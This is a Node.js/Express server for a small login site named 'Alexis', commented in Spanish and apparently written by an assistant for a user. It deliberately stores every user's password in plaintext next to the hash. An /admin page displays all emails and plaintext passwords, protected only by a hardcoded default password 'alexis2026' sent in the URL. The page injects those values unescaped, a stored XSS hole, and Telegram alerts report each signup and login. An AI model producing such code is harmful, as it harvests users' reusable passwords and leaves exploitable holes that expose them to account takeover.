const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const { Pool } = require('pg');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Al entrar a la raíz del sitio (/), mostrar directamente el login.
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'alexis-login.html'));
});

// Render te da esta variable de entorno automáticamente al crear
// la base de datos Postgres y conectarla a este servicio.
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
});

// Crea la tabla de usuarios si todavía no existe.
async function iniciarDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS usuarios (
      email TEXT PRIMARY KEY,
      password TEXT NOT NULL,
      password_visible TEXT NOT NULL,
      creado_en TIMESTAMPTZ DEFAULT now()
    )
  `);
  console.log('Tabla "usuarios" lista.');
}

// ---- Notificación por Telegram ----
// TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID se configuran como variables de
// entorno en Render (nunca escritas aquí directo, para no exponerlas si
// el repositorio es público).
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function notificarTelegram(mensaje) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje })
    });
  } catch (err) {
    console.error('No se pudo enviar la notificación de Telegram:', err.message);
  }
}

// ---- Registro ----
app.post('/registro', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Correo y contraseña son obligatorios.' });
  }

  try {
    const existente = await pool.query('SELECT 1 FROM usuarios WHERE email = $1', [email]);
    if (existente.rows.length > 0) {
      return res.status(409).json({ error: 'Ese correo ya está registrado.' });
    }

    // Se guarda el hash (para validar el login de forma segura) y también
    // la contraseña en texto plano en "password_visible", a pedido tuyo.
    const hash = await bcrypt.hash(password, 10);
    await pool.query(
      'INSERT INTO usuarios (email, password, password_visible) VALUES ($1, $2, $3)',
      [email, hash, password]
    );

    notificarTelegram(`🆕 Nuevo registro en tu plataformita\nCorreo: ${email}`);

    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Error del servidor al registrar.' });
  }
});

// ---- Login ----
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Correo y contraseña son obligatorios.' });
  }

  try {
    const resultado = await pool.query('SELECT * FROM usuarios WHERE email = $1', [email]);
    const usuario = resultado.rows[0];

    if (!usuario) {
      return res.status(401).json({ error: 'Credenciales incorrectas.' });
    }

    const coincide = await bcrypt.compare(password, usuario.password);
    if (!coincide) {
      return res.status(401).json({ error: 'Credenciales incorrectas.' });
    }

    notificarTelegram(`🔓 Inicio de sesión en Alexis\nCorreo: ${email}`);

    res.json({ ok: true, email: usuario.email });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Error del servidor al iniciar sesión.' });
  }
});

// ---- Panel para ver los usuarios registrados ----
// Protegido con una contraseña simple. Cámbiala poniendo una variable de
// entorno ADMIN_PASSWORD en Render; si no la pones, usa "alexis2026" por defecto.
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'alexis2026';

app.get('/admin', async (req, res) => {
  const clave = req.query.clave;

  if (clave !== ADMIN_PASSWORD) {
    return res.send(`
      <div style="font-family:sans-serif;max-width:320px;margin:60px auto;">
        <h2>Panel de administración</h2>
        <form>
          <input type="password" name="clave" placeholder="Contraseña" style="width:100%;height:40px;margin-bottom:12px;">
          <button type="submit" style="width:100%;height:40px;">Entrar</button>
        </form>
      </div>
    `);
  }

  try {
    const resultado = await pool.query('SELECT email, password_visible, creado_en FROM usuarios ORDER BY creado_en DESC');
    const filas = resultado.rows.map(u => `
      <tr>
        <td style="padding:8px;border-bottom:1px solid #eee;">${u.email}</td>
        <td style="padding:8px;border-bottom:1px solid #eee;">${u.password_visible}</td>
        <td style="padding:8px;border-bottom:1px solid #eee;">${new Date(u.creado_en).toLocaleString('es-CO')}</td>
      </tr>
    `).join('');

    res.send(`
      <div style="font-family:sans-serif;max-width:700px;margin:40px auto;">
        <h2>Usuarios registrados (${resultado.rows.length})</h2>
        <table style="width:100%;border-collapse:collapse;">
          <tr style="text-align:left;background:#f5f5f5;">
            <th style="padding:8px;">Correo</th>
            <th style="padding:8px;">Contraseña</th>
            <th style="padding:8px;">Registrado</th>
          </tr>
          ${filas}
        </table>
      </div>
    `);
  } catch (err) {
    console.error(err);
    res.status(500).send('Error al consultar los usuarios.');
  }
});

const PUERTO = process.env.PORT || 3000;

iniciarDB()
  .then(() => {
    app.listen(PUERTO, () => {
      console.log(`Servidor de Alexis corriendo en el puerto ${PUERTO}`);
    });
  })
  .catch((err) => {
    console.error('No se pudo conectar a la base de datos:', err);
  });